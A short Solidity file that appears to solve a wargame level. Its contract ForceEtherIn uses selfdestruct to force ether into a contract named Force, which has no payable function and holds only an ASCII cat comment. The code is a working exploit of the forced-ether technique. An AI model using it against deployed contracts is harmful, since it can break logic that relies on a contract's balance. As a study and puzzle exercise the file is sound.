// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceEtherIn{

    Force force;

    constructor(address _address) {
        force = Force(_address);
    }

    function sendEther() public {
        selfdestruct(payable(address(force)));
    }
    
    receive() external payable{
    }
}

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}